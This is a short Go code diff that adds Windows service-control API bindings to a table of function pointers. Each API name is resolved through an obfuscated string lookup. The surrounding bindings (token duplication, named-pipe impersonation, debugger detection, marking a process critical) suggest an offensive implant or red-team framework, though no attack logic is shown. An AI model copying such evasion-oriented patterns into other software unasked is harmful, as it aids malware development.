@@ -61,6 +61,7 @@ var (
 	funcTerminateThread                                     = dllKernel32.proc(crypt.Get(171)) // TerminateThread
 	funcOpenThreadToken                                     = dllAdvapi32.proc(crypt.Get(172)) // OpenThreadToken
 	funcNtResumeProcess                                     = dllNtdll.proc(crypt.Get(173))    // NtResumeProcess
+	funcSetServiceStatus                                    = dllAdvapi32.proc(crypt.Get(212)) // SetServiceStatus
 	funcConnectNamedPipe                                    = dllKernel32.proc(crypt.Get(174)) // ConnectNamedPipe
 	funcTerminateProcess                                    = dllKernel32.proc(crypt.Get(175)) // TerminateProcess
 	funcDuplicateTokenEx                                    = dllAdvapi32.proc(crypt.Get(176)) // DuplicateTokenEx
@@ -85,16 +86,20 @@ var (
 	funcNtAllocateVirtualMemory                             = dllNtdll.proc(crypt.Get(194))    // NtAllocateVirtualMemory
 	funcRtlSetProcessIsCritical                             = dllNtdll.proc(crypt.Get(195))    // RtlSetProcessIsCritical
 	funcCreateToolhelp32Snapshot                            = dllKernel32.proc(crypt.Get(196)) // CreateToolhelp32Snapshot
-	FuncUpdateProcThreadAttribute                           = dllKernel32.proc(crypt.Get(197)) // UpdateProcThreadAttribute
+	funcUpdateProcThreadAttribute                           = dllKernel32.proc(crypt.Get(197)) // UpdateProcThreadAttribute
 	funcNtQueryInformationProcess                           = dllNtdll.proc(crypt.Get(198))    // NtQueryInformationProcess
 	funcLsaQueryInformationPolicy                           = dllAdvapi32.proc(crypt.Get(199)) // LsaQueryInformationPolicy
+	funcStartServiceCtrlDispatcher                          = dllAdvapi32.proc(crypt.Get(213)) // StartServiceCtrlDispatcherW
 	funcImpersonateNamedPipeClient                          = dllAdvapi32.proc(crypt.Get(200)) // ImpersonateNamedPipeClient
 	funcCheckRemoteDebuggerPresent                          = dllKernel32.proc(crypt.Get(201)) // CheckRemoteDebuggerPresent
 	funcGetSecurityDescriptorLength                         = dllAdvapi32.proc(crypt.Get(202)) // GetSecurityDescriptorLength
+	funcRegisterServiceCtrlHandlerEx                        = dllAdvapi32.proc(crypt.Get(215)) // RegisterServiceCtrlHandlerExW
 	funcDeleteProcThreadAttributeList                       = dllKernel32.proc(crypt.Get(203)) // DeleteProcThreadAttributeList
-	FuncInitializeProcThreadAttributeList                   = dllKernel32.proc(crypt.Get(204)) // InitializeProcThreadAttributeList
+	funcQueryServiceDynamicInformation                      = dllAdvapi32.proc(crypt.Get(214)) // QueryServiceDynamicInformation
+	funcInitializeProcThreadAttributeList                   = dllKernel32.proc(crypt.Get(204)) // InitializeProcThreadAttributeList
 	funcWinHTTPGetDefaultProxyConfiguration                 = dllWinhttp.proc(crypt.Get(205))  // WinHttpGetDefaultProxyConfiguration
 	funcConvertStringSecurityDescriptorToSecurityDescriptor = dllAdvapi32.proc(crypt.Get(206)) // ConvertStringSecurityDescriptorToSecurityDescriptorW
+
 )
 
 func doSearchSystem32() bool {
